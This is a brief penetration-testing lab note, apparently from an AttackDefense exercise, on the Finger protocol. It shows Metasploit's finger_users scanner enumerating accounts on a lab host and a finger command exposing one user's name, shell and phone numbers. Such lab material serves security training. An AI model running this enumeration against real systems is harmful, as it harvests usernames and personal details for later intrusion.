```
In computer networking, the Name/Finger protocol and the Finger user information protocol are simple network protocols for the exchange of human-oriented status and user information. 
```

### finger Metasploit module

```
msf5 auxiliary(scanner/finger/finger_users) > exploit

[+] 192.122.140.3:79      - 192.122.140.3:79 - Found user: admin
[...]
[+] 192.122.140.3:79      - 192.122.140.3:79 Users found: admin, administrator, backup, bin, daemon, dbadmin, diag, games, gnats, gopher, irc, list, lp, mail, man, news, nobody, proxy, root, saned, sync, sys, systemd-bus-proxy, udadmin, uucp, webmaster, www-data
[*] 192.122.140.3:79      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
### finger exploitation

```
root@attackdefense:~# finger admin@192.122.140.3
Login: admin                            Name: Jason L. Nawrocki
Directory: /home/admin                  Shell: /bin/bash
Office: 5877, 989-905-2731              Home Phone: 978-272-5420
Never logged in.
No mail.
No Plan.
```